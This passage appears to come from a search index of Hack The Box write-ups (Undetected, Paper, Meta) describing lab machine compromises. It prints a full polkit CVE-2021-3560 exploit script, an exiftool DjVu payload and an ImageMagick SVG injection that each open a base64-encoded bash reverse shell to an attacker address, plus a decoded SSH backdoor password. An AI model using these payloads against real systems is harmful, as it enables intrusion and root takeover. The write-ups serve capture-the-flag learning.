we can guess that it is a string (char[31]). We can join all the pieces to build the string, taking into account that _0_4_ means from index 0 and 4 bytes long. Moreover, hexadecimal numbers must be formatted in littel-endian to become bytes.\nThere is a number -0x5b that must be put in positive because it must be a valid ASCII code (between 0 and 255, that is 0x00 and 0xff). We need to compute the two\u0026rsquo;s complement, which is the same as negating the number (in positive) and adding 1: ~(0x5b) + 1 = 0xa4 + 1 = 0xa5.\nWe can use some packing functions from pwntools to pack the numbers depending on the size of the number (i.e., p64, p32, p16 or p8).\nWe see an instruction strcmp(password, backdoor) which might be comparing a password given to ssh with the backdoor variable we are working on. However, before doing the comparison, there is a cryptographic operation on backdoor.\nThe while loop is performing a XOR operation over every character of backdoor using 0x96 as key. To decrypt a XOR cipher, we must perform another XOR operation but between the ciphertext and the same key used to encrypt, that is 0x96.\nPrivilege escalation Now we have everything we need to get the expected password. We can use Python and pwntools to compute the password:\n$ python -q \u0026gt;\u0026gt;\u0026gt; from pwn import p8, p16, p32, p64 \u0026gt;\u0026gt;\u0026gt; backdoor = p32(0xf0e7abd6) \u0026gt;\u0026gt;\u0026gt; backdoor += p32(0xa4b3a3f3) \u0026gt;\u0026gt;\u0026gt; backdoor += p32(0xf7bbfdc8) \u0026gt;\u0026gt;\u0026gt; backdoor += p32(0xfdb3d6e7) \u0026gt;\u0026gt;\u0026gt; backdoor += p64(0xb2d6f4a0fda0b3d6) \u0026gt;\u0026gt;\u0026gt; backdoor += p32(0xbcf0b5e3) \u0026gt;\u0026gt;\u0026gt; backdoor += p16(0xa9f4) \u0026gt;\u0026gt;\u0026gt; backdoor += p8(0xa5) \u0026gt;\u0026gt;\u0026gt; ''.join(map(lambda b: chr(b ^ 0x96), backdoor)) '@=qfe5%2^k-aq@%k@%6k6b@$u#f*b?3'  Despite being unintelligible, if we provide this password for user root, we can access via SSH. Moreover, we can confirm that the machine was already comprimised because the cybercriminals got root access via SSH:\n$ ssh root@10.10.11.146 root@10.10.11.146's password: root@production:~# cat root.txt 3afbb2e3f9d6f2329f00f41711a94cd8  ","image":"/images/HTB/Undetected/Undetected.png","permalink":"https://7rocky.github.io/en/htb/undetected/","section":"htb","summary":"Hack The Box. Linux. Medium machine. This machine has a website in PHP with a third-party dependency that is vulnerable to RCE. The machine has already been compromised and has some backdoors and exploits that need to be detected and analyzed using reverse engineering techniques","time":12,"title":"Undetected"},{"contents":"  OS: Linux   Difficulty: Easy   IP Address: 10.10.11.143   Release: 05 / 02 / 2022   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.143 -p 22,80,443 Nmap scan report for paper.htb (10.10.11.143) Host is up (0.038s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.0 (protocol 2.0) | ssh-hostkey: | 2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA) | 256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA) |_ 256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519) 80/tcp open http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9) |_http-title: HTTP Server Test Page powered by CentOS |_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9 443/tcp open ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9) | http-methods: |_ Potentially risky methods: TRACE |_http-title: HTTP Server Test Page powered by CentOS |_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9 |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US | Subject Alternative Name: DNS:localhost.localdomain | Not valid before: 2021-07-03T08:52:34 |_Not valid after: 2022-07-08T10:32:34 |_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28 | tls-alpn: |_ http/1.1 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 35.70 seconds  This machine has ports 22 (SSH), 80 (HTTP) and 443 (HTTPS) open.\nEnumeration If we go to http://10.10.11.143, we will see a default Apache site for CentOS:\nThere is nothing useful here but a response header called X-Backend-Server that shows a domain:\n$ curl -I 10.10.11.143 HTTP/1.1 403 Forbidden Date: Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9 X-Backend-Server: office.paper Last-Modified: Sun, 27 Jun 2021 23:47:13 GMT ETag: \"30c0b-5c5c7fdeec240\" Accept-Ranges: bytes Content-Length: 199691 Content-Type: text/html; charset=UTF-8  Let\u0026rsquo;s continue enumerating subdomains:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.11.143/ -H 'Host: FUZZ.office.paper' -fc 403 chat [Status: 200, Size: 223163, Words: 13014, Lines: 508]  Now we can add these subdomains domain to /etc/hosts. If we go to http://chat.office.paper, we will see a Rocket.chat application, but we need a registration URL in order to create a new account:\nWordpress enumeration If we go to http://office.paper, we will see a Wordpress site:\nThe last post contains a comment telling us that there might be secret information inside draft posts:\nWe can enumerate the Wordpress version in a couple of ways. For example:\n$ curl -s office.paper | grep generator \u0026lt;meta name=\"generator\" content=\"Wordpress 5.2.3\" /\u0026gt;  Now we are able to search for vulnerabilities that match with this version:\n$ searchsploit Wordpress 5.2.3 ------------------------------------------------------------------------- ---------------------------- Exploit Title | Path ------------------------------------------------------------------------- ---------------------------- Wordpress Core 5.2.3 - Cross-Site Host Modification | php/webapps/47361.pl Wordpress Core 5.2.3 - Viewing Unauthenticated/Password/Private Posts | multiple/webapps/47690.md Wordpress Core Wordpress Plugin DZS Videogallery Wordpress Plugin iThemes Security Wordpress Plugin Rest Google Maps  The file only tells us to add ?static=1 in order to see draft content:\nSo far we know that adding `?static=1` to a Wordpress URL should leak its secret content Here are a few ways to manipulate the returned entries: - `order` with `asc` or `desc` - `orderby` - `m` with `m=YYYY`, `m=YYYYMM` or `m=YYYYMMDD` date format In this case, simply reversing the order of the returned elements suffices and `http://wordpress.local/?static=1\u0026amp;order=asc` will show the secret content.  Foothold So, let\u0026rsquo;s try it:\nAlright, we have the registration link for Rocket.chat:\nInteracting with a chat bot After registering a new account, we enter to a general chat:\nThere is a chat bot called recyclops that allows us to list directories and read files from the server:\nWe can try some command injection payloads but they do not work. Instead, we can list some directories and find out that the chat bot is built with hubot:\nNotice that we need to use .. in order to list the parent directory.\nIf we search for documentation for Rocket.chat and hubot, we will get to this: developer.rocket.chat. As it is explained, the bot needs a .env file with some environment variables, one of them being the password for the bot user. Now we can read this file:\nAnd we get a potential password: Queenofblad3s!23.\nPassword reuse Now we can try to reuse the password for SSH for users hubot and dwight. The password is reused for dwight:\n$ ssh hubot@office.paper hubot@office.paper's password: Permission denied, please try again. $ ssh dwight@office.paper dwight@office.paper's password: [dwight@paper ~]$ cat user.txt 1c16f7c5b0aa6e8aaa242fe98cfbc2cc  At this point, we have read the user.txt flag.\nPrivilege escalation There is a script called pk.sh at the home directory:\n[dwight@paper ~]$ ls -la total 36 drwx------ 11 dwight dwight 294 Feb 5 17:49 . drwxr-xr-x. 3 root root 20 Jan 14 06:50 .. lrwxrwxrwx 1 dwight dwight 9 Jul 3 2021 .bash_history - /dev/null -rw-r--r-- 1 dwight dwight 18 May 10 2019 .bash_logout -rw-r--r-- 1 dwight dwight 141 May 10 2019 .bash_profile -rw-r--r-- 1 dwight dwight 358 Jul 3 2021 .bashrc drwx------ 5 dwight dwight 56 Jul 3 2021 .config -rw------- 1 dwight dwight 16 Jul 3 2021 .esd_auth drwx------ 2 dwight dwight 44 Jul 3 2021 .gnupg -rw-rw-r-- 1 dwight dwight 18 Sep 16 07:24 .hubot_history drwx------ 3 dwight dwight 19 Jul 3 2021 .local drwxr-xr-x 4 dwight dwight 39 Jul 3 2021 .mozilla drwxrwxr-x 5 dwight dwight 83 Jul 3 2021 .npm drwx------ 2 dwight dwight 6 Sep 16 08:56 .ssh drwxr-xr-x 2 dwight dwight 24 Sep 16 07:09 .vim -rwxr-xr-x 1 dwight dwight 1174 Sep 16 06:58 bot_restart.sh drwx------ 8 dwight dwight 4096 Sep 16 07:57 hubot -rwxrwxr-x 1 dwight dwight 2812 Jan 14 06:48 pk.sh drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 sales -r-------- 1 dwight dwight 33 Feb 5 17:49 user.txt  #!/bin/bash # Set the name and display name userName=\"hacked\" realName=\"hacked\" # Set the account as an administrator accountType=1 # Set the password hash for 'password' and password hint password='$5$WR3c6uwMGQZ/JEZw$OlBVzagNJswkWrKRSuoh/VCrZv183QpZL7sAeskcoTB' passHint=\"password\" # Check Polkit version polkitVersion=$(systemctl status polkit.service | grep version | cut -d \" \" -f 9) if [[ \"$(apt list --installed 2\u0026gt;/dev/null | grep polkit | grep -c 0.105-26)\" -ge 1 || \"$(yum list installed | grep polkit | grep -c 0.117-2)\" ]]; then echo \"[*] Vulnerable version of polkit found\" else echo \"[!] WARNING: Version of polkit might not vulnerable\" fi # Validate user is running in SSH instead of desktop terminal if [[ -z $SSH_CLIENT || -z $SSH_TTY ]]; then echo \"[!] WARNING: SSH into localhost first before running this script in order to avoid authentication prompts\" exit fi # Test the dbus-send timing to load into exploit echo \"[*] Determining dbus-send timing\" realTime=$( TIMEFORMAT=\"%R\" { time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$userName string:$realName int32:$accountType; } 2\u0026gt;\u0026amp;1 | cut -d \" \" -f6 ) halfTime=$(echo \"scale=3;$realTime/2\" | bc) # Check for user first in case previous run of script failed on password set if id \"$userName\" \u0026amp;\u0026gt;/dev/null; then userid=$(id -u $userName) echo \"[*] New user $userName already exists with uid of $userid\" else userid=\"\" echo \"[*] Attempting to create account\" while [[ $userid == \"\" ]]; do dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$userName string:$realName int32:$accountType 2\u0026gt;/dev/null \u0026amp; sleep $halfTime kill $! 2\u0026gt;/dev/null if id \"$userName\" \u0026amp;\u0026gt;/dev/null; then userid=$(id -u $userName) echo \"[*] New user $userName created with uid of $userid\" fi done fi # Add the password to /etc/shadow # Sleep added to ensure there is enough of a delay between timestamp checks echo \"[*] Adding password to /etc/shadow and enabling user\" sleep 1 currentTimestamp=$(stat -c %Z /etc/shadow) fileChanged=\"n\" while [ $fileChanged == \"n\" ]; do dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User$userid org.freedesktop.Accounts.User.SetPassword string:$password string:$passHint 2\u0026gt;/dev/null \u0026amp; sleep $halfTime kill $! 2\u0026gt;/dev/null if [ $(stat -c %Z /etc/shadow) -ne $currentTimestamp ]; then fileChanged=\"y\" echo \"[*] Exploit complete!\" fi done echo \"\" echo \"[*] Run 'su - $userName', followed by 'sudo su' to gain root access\"  This is a script that exploits a pkexec vulnerability in PolKit, CVE-2021-3560.\nIf we run this exploit, a new user called hacked will be created (password: password) with sudo permissions to become root:\n[dwight@paper ~]$ ./pk.sh Failed to set locale, defaulting to C.UTF-8 Invalid configuration value: failovermethod=priority in /etc/yum.repos.d/nodesource-el8.repo; Configuration: OptionBinding with id \"failovermethod\" does not exist Invalid configuration value: failovermethod=priority in /etc/yum.repos.d/nodesource-el8.repo; Configuration: OptionBinding with id \"failovermethod\" does not exist Modular dependency problems: Problem 1: conflicting requests - nothing provides module(perl:5.26) needed by module perl-IO-Socket-SSL:2.066:8030020201222215140:1e4bbb35.x86_64 Problem 2: conflicting requests - nothing provides module(perl:5.26) needed by module perl-libwww-perl:6.34:8030020201223164340:b967a9a2.x86_64 [*] Vulnerable version of polkit found [*] Determining dbus-send timing [*] Attempting to create account ./pk.sh: line 48: 68220 Terminated dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$userName string:$realName int32:$accountType 2 /dev/null ./pk.sh: line 48: 68226 Terminated dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$userName string:$realName int32:$accountType 2 /dev/null ./pk.sh: line 48: 68234 Terminated dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$userName string:$realName int32:$accountType 2 /dev/null ./pk.sh: line 48: 68241 Terminated dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$userName string:$realName int32:$accountType 2 /dev/null ./pk.sh: line 48: 68248 Terminated dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$userName string:$realName int32:$accountType 2 /dev/null ./pk.sh: line 48: 68255 Terminated dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$userName string:$realName int32:$accountType 2 /dev/null ./pk.sh: line 48: 68262 Terminated dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$userName string:$realName int32:$accountType 2 /dev/null ./pk.sh: line 48: 68269 Terminated dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$userName string:$realName int32:$accountType 2 /dev/null ./pk.sh: line 48: 68277 Terminated dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$userName string:$realName int32:$accountType 2 /dev/null ./pk.sh: line 48: 68281 Terminated dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$userName string:$realName int32:$accountType 2 /dev/null [*] New user hacked created with uid of 1005 [*] Adding password to /etc/shadow and enabling user ./pk.sh: line 63: 68293 Terminated dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User$userid org.freedesktop.Accounts.User.SetPassword string:$password string:$passHint 2 /dev/null [*] Exploit complete! [*] Run 'su - hacked', followed by 'sudo su' to gain root access [dwight@paper ~]$ su hacked Password: [hacked@paper dwight]$ sudo su [sudo] password for hacked: We trust you have received the usual lecture from the local System Administrator. It usually boils down to these three things: #1) Respect the privacy of others. #2) Think before you type. #3) With great power comes great responsibility. [root@paper dwight]# cat /root/root.txt 6ca0add99568e6f2866e5a006c815866  Although the presence of this exploit inside the machine was unintended, the machine is still vulnerable to PwnKit after the patch. We can use poc.sh to exploit it as well (indeed, the linked repository is owned by secnigma, the machine creator):\n[dwight@paper ~]$ ./poc.sh -u=rocky -p=rocky [!] Username set as : rocky [!] No Custom Timing specified. [!] Timing will be detected Automatically [!] Force flag not set. [!] Vulnerability checking is ENABLED! [!] Starting Vulnerability Checks... [!] Checking distribution... [!] Detected Linux distribution as \"centos\" [!] Checking if Accountsservice and Gnome-Control-Center is installed [+] Accounts service and Gnome-Control-Center Installation Found!! [!] Checking if polkit version is vulnerable [+] Polkit version appears to be vulnerable!! [!] Starting exploit... [!] Inserting Username rocky... Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required [+] Inserted Username rocky with UID 1005! [!] Inserting password hash... [!] It looks like the password insertion was succesful! [!] Try to login as the injected user using sudo - rocky [!] When prompted for password, enter your password [!] If the username is inserted, but the login fails; try running the exploit again. [!] If the login was succesful,simply enter 'sudo bash' and drop into a root shell! [dwight@paper ~]$ su rocky Password: su: Authentication failure  It may fail some times, but the user is created:\n[dwight@paper ~]$ cat /etc/passwd | grep rocky rocky:x:1005:1005:rocky:/home/rocky:/bin/bash  So we need to run it multiple times until we can access correctly:\n[dwight@paper ~]$ ./poc.sh -u=rocky -p=rocky [!] Username set as : rocky [!] No Custom Timing specified. [!] Timing will be detected Automatically [!] Force flag not set. [!] Vulnerability checking is ENABLED! [!] Starting Vulnerability Checks... [!] Checking distribution... [!] Detected Linux distribution as \"centos\" [!] Checking if Accountsservice and Gnome-Control-Center is installed [+] Accounts service and Gnome-Control-Center Installation Found!! [!] Checking if polkit version is vulnerable [+] Polkit version appears to be vulnerable!! [!] Starting exploit... [!] Inserting Username rocky... Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required [+] Inserted Username rocky with UID 1005! [!] Inserting password hash... [!] It looks like the password insertion was succesful! [!] Try to login as the injected user using sudo - rocky [!] When prompted for password, enter your password [!] If the username is inserted, but the login fails; try running the exploit again. [!] If the login was succesful,simply enter 'sudo bash' and drop into a root shell! [dwight@paper ~]$ su rocky Password: [rocky@paper dwight]$  Now we have sudo permissions, so we can escalate to root:\n[rocky@paper dwight]$ sudo bash We trust you have received the usual lecture from the local System Administrator. It usually boils down to these three things: #1) Respect the privacy of others. #2) Think before you type. #3) With great power comes great responsibility. [sudo] password for rocky: [root@paper dwight]# cat /root/root.txt 6ca0add99568e6f2866e5a006c815866  ","image":"/images/HTB/Paper/Paper.png","permalink":"https://7rocky.github.io/en/htb/paper/","section":"htb","summary":"Hack The Box. Linux. Easy machine. This machine contains a Wordpress website that has some secret information hidden in draft posts, and also a chat bot that shows sensitive information. After that, the server happens to be vulnerable to PolKit. Wordpress enumeration is needed to compromise the machine","time":10,"title":"Paper"},{"contents":"  OS: Linux   Difficulty: Medium   IP Address: 10.10.11.140   Release: 22 / 01 / 2022   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted -p 22,80 10.10.11.140 Nmap scan report for 10.10.11.140 Host is up (0.064s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA) | 256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA) |_ 256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519) 80/tcp open http Apache httpd |_http-title: Did not follow redirect to http://artcorp.htb |_http-server-header: Apache Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 10.97 seconds  This machine has ports 22 (SSH) and 80 (HTTP) open.\nEnumeration If we go to http://10.10.11.140, we are redirected to http://artcorp.htb, so we need to add this domain in /etc/hosts. Then we have this website:\nIt seems to be just a static website. Let\u0026rsquo;s apply fuzzing to enumerate more routes:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://artcorp.htb/FUZZ assets [Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 49ms] css [Status: 301, Size: 231, Words: 14, Lines: 8, Duration: 51ms] [Status: 200, Size: 4427, Words: 1663, Lines: 87, Duration: 74ms] server-status [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 83ms]  Nothing interesting at all. Since there is a domain artcorp.htb, it is likely that there exist subdomains. Let\u0026rsquo;s enumerate:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.11.140/ -H 'Host: FUZZ.artcorp.htb' -r -fl 87 dev01 [Status: 200, Size: 247, Words: 16, Lines: 10, Duration: 59ms]  Alright, now we can enter dev01.artcorp.htb in /etc/hosts. We have this website:\nFoothold So we have the chance to upload images. And this is the output:\nExploiting exiftool Actually, that\u0026rsquo;s the output of exiftool. There exists some CVE regarding exiftool. Indeed, the one that is exploitable is the CVE-2022-23935, similar to the one exploited in Overflow. So, let\u0026rsquo;s reproduce the steps (more information here):\n$ echo -n 'bash -i \u0026 /dev/tcp/10.10.17.44/4444 0\u00261' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx $ vim payload $ cat payload (metadata \"\\c${system('echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash')};\") $ bzz payload payload.bzz $ djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz $ vim configfile $ exiftool -config configfile '-HasselbladExif hacker.jpg 1 image files updated  Now, we upload the maliciously crafted image (hacker.jpg) and we get a reverse shell:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.140. Ncat: Connection from 10.10.11.140:45692. bash: cannot set terminal process group (624): Inappropriate ioctl for device bash: no job control in this shell www-data@meta:/var/www/dev01.artcorp.htb/metaview$ cd / cd / www-data@meta:/$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null www-data@meta:/$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm www-data@meta:/$ export TERM=xterm www-data@meta:/$ export SHELL=bash www-data@meta:/$ stty rows 50 columns 158  System enumeration After basic enumeration, we can try to enumerate running processes or Cron jobs using pspy:\nCMD: UID=0 PID=22988 | /usr/sbin/CRON -f CMD: UID=1000 PID=22987 | /bin/bash /usr/local/bin/convert_images.sh CMD: UID=0 PID=22989 | /bin/sh -c rm /var/www/dev01.artcorp.htb/metaview/uploads/* CMD: UID=1000 PID=22990 | /bin/bash /usr/local/bin/convert_images.sh CMD: UID=0 PID=22992 | /bin/sh -c rm /var/www/dev01.artcorp.htb/convert_images/* CMD: UID=0 PID=22991 | /bin/sh -c cp -rp ~/conf/config_neofetch.conf /home/thomas/.config/neofetch/config.conf CMD: UID=0 PID=22993 | /bin/sh -c rm /tmp/* CMD: UID=1000 PID=22994 | pkill mogrify  We find interesting commands:\n /bin/bash /usr/local/bin/convert_images.sh cp -rp ~/conf/config_neofetch.conf /home/thomas/.config/neofetch/config.conf  Lateral movement to user thomas The second one is executed by user thomas:\nwww-data@meta:/var/www/dev01.artcorp.htb/metaview$ ls /home thomas www-data@meta:/var/www/dev01.artcorp.htb/metaview$ ls -la /home/thomas total 32 drwxr-xr-x 4 thomas thomas 4096 Jan 17 2022 . drwxr-xr-x 3 root root 4096 Aug 29 2021 .. lrwxrwxrwx 1 root root 9 Aug 29 2021 .bash_history - /dev/null -rw-r--r-- 1 thomas thomas 220 Aug 29 2021 .bash_logout -rw-r--r-- 1 thomas thomas 3526 Aug 29 2021 .bashrc drwxr-xr-x 3 thomas thomas 4096 Aug 30 2021 .config -rw-r--r-- 1 thomas thomas 807 Aug 29 2021 .profile drwx------ 2 thomas thomas 4096 Jan 4 2022 .ssh -rw-r----- 1 root thomas 33 Oct 10 14:28 user.txt www-data@meta:/var/www/dev01.artcorp.htb/metaview$ ls -la /home/thomas/.config/ total 12 drwxr-xr-x 3 thomas thomas 4096 Aug 30 2021 . drwxr-xr-x 4 thomas thomas 4096 Jan 17 2022 .. drwxr-xr-x 2 thomas thomas 4096 Dec 20 2021 neofetch  So it is not interesting yet. Let\u0026rsquo;s focus on the first command:\nwww-data@meta:/tmp$ cat /usr/local/bin/convert_images.sh  #!/bin/bash cd/var/www/dev01.artcorp.htb/convert_images/ \u0026amp;\u0026amp;/usr/local/bin/mogrify -format png *.*2\u0026gt;/dev/null  pkill mogrify  Exploiting mogrify It uses mogrify to format PNG images. Actually, mogrify is part of ImageMagick:\nwww-data@meta:/tmp$ file /usr/local/bin/mogrify /usr/local/bin/mogrify: symbolic link to magick www-data@meta:/tmp$ ls -l /usr/local/bin/mogrify lrwxrwxrwx 1 root root 6 Aug 29 2021 /usr/local/bin/mogrify -\u0026gt; magick www-data@meta:/tmp$ ls -l /usr/local/bin/magick -rwxr-xr-x 1 root root 40048 Aug 29 2021 /usr/local/bin/magick www-data@meta:/tmp$ file /usr/local/bin/magick /usr/local/bin/magick: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=fd45a758ab7b339514d807f4864ab010510497ac, with debug_info, not stripped  We have version 7.0.10-36:\nwww-data@meta:/var/www/dev01.artcorp.htb/metaview$ /usr/local/bin/magick -version Version: ImageMagick 7.0.10-36 Q16 x86_64 2021-08-29 https://imagemagick.org Copyright: © 1999-2020 ImageMagick Studio LLC License: https://imagemagick.org/script/license.php Features: Cipher DPC HDRI OpenMP(4.5) Delegates (built-in): fontconfig freetype jng jpeg png x xml zlib  There are some vulnerabilities regarding ImageMagick. The one that is exploitable has to do with command injection (more information here). We can reproduce a proof of concept with this SVG file:\n\u0026lt;imageauthenticate='ff\" `echo $(id)\u0026gt; /dev/shm/0wned`;\"'\u0026gt; \u0026lt;readfilename=\"pdf:/etc/passwd\"/\u0026gt; \u0026lt;getwidth=\"base-width\"height=\"base-height\"/\u0026gt; \u0026lt;resizegeometry=\"400x400\"/\u0026gt; \u0026lt;writefilename=\"test.png\"/\u0026gt; \u0026lt;svgwidth=\"700\"height=\"700\"xmlns=\"http://www.w3.org/2000/svg\"xmlns:xlink=\"http://www.w3.org/1999/xlink\"\u0026gt;  \u0026lt;imagexlink:href=\"msl:poc.svg\"height=\"100\"width=\"100\"/\u0026gt; \u0026lt;/svg\u0026gt; \u0026lt;/image\u0026gt;  Let\u0026rsquo;s create the file and wait until we see the file named 0wned in /dev/shm:\nwww-data@meta:/var/www/dev01.artcorp.htb/metaview$ cd /tmp www-data@meta:/tmp$ cat \u0026gt; poc.svg \u0026lt;image authenticate='ff\" `echo $(id)\u0026gt; /dev/shm/0wned`;\"'\u0026gt; \u0026lt;read filename=\"pdf:/etc/passwd\"/\u0026gt; \u0026lt;get width=\"base-width\" height=\"base-height\" /\u0026gt; \u0026lt;resize geometry=\"400x400\" /\u0026gt; \u0026lt;write filename=\"test.png\" /\u0026gt; \u0026lt;svg width=\"700\" height=\"700\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"\u0026gt; \u0026lt;image xlink:href=\"msl:poc.svg\" height=\"100\" width=\"100\"/\u0026gt; \u0026lt;/svg\u0026gt; \u0026lt;/image\u0026gt; ^C www-data@meta:/tmp$ cp poc.svg /var/www/dev01.artcorp.htb/convert_images/ www-data@meta:/tmp$ watch -n 1 ls -l /dev/shm/ www-data@meta:/tmp$ cat /dev/shm/0wned uid=1000(thomas) gid=1000(thomas) groups=1000(thomas)  So we have code execution as thomas. Let\u0026rsquo;s get a reverse shell:\nwww-data@meta:/tmp$ cat \u0026gt; poc.svg \u0026lt;image authenticate='ff\" `echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash`;\"'\u0026gt; \u0026lt;read filename=\"pdf:/etc/passwd\"/\u0026gt; \u0026lt;get width=\"base-width\" height=\"base-height\" /\u0026gt; \u0026lt;resize geometry=\"400x400\" /\u0026gt; \u0026lt;write filename=\"test.png\" /\u0026gt; \u0026lt;svg width=\"700\" height=\"700\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"\u0026gt; \u0026lt;image xlink:href=\"msl:poc.svg\" height=\"100\" width=\"100\"/\u0026gt; \u0026lt;/svg\u0026gt; \u0026lt;/image\u0026gt; ^C www-data@meta:/tmp$ cp poc.svg /var/www/dev01.artcorp.htb/convert_images/  $ nc -nlvp 4444 Ncat: Version 7.93 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.140. Ncat: Connection from 10.10.11.140:52884. bash: cannot set terminal process group (3281): Inappropriate ioctl for device bash: no job control in this shell thomas@meta:/var/www/dev01.artcorp.htb/convert_images$ cd cd thomas@meta:~$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null thomas@meta:~$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [2] - continued ncat -nlvp 4444 reset xterm thomas@meta:~$ export TERM=xterm thomas@meta:~$ export SHELL=bash thomas@meta:~$ stty rows 50 columns 158  At this point, we can read the user.txt flag:\nthomas@meta:~$ cat user.txt 90e73aa77e1fcd5656877f63ae5c9fc5  Privilege escalation This user is able to run sudo:\nthomas@meta:~$ sudo -l Matching Defaults entries for thomas on meta: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, env_keep+=XDG_CONFIG_HOME User thomas may run the following commands on meta: (root) NOPASSWD: /usr/bin/neofetch \\\"\\\"  We are allowed to run neofetch as root without password:\nthomas@meta:~$ sudo /usr/bin/neofetch \\\"\\\" _,met$$$$$gg. root@meta ,g$$$$$$$$$$$$$$$P. --------- ,g$$P\" \"\"\"Y$$.\". OS: Debian GNU/Linux 10 (buster) x86_64 ,$$P' `$$$. Host: VMware Virtual Platform None ',$$P ,ggs. `$$b: Kernel: 4.19.0-17-amd64 `d$$' ,$P\"' .$$$ Uptime: 1 hour, 24 mins $$P d$' ,$$P Packages: 495 (dpkg) $$: $$. -,d$$' Shell: bash 5.0.3 $$; Y$b._ _,d$P' Terminal: script Y$$. `.`\"Y$$$$P\"' CPU: AMD EPYC 7302P 16- (2) @ 2.994GHz `$$b \"-.__ GPU: VMware SVGA II Adapter `Y$$ Memory: 139MiB / 1994MiB `Y$$. `$$b.  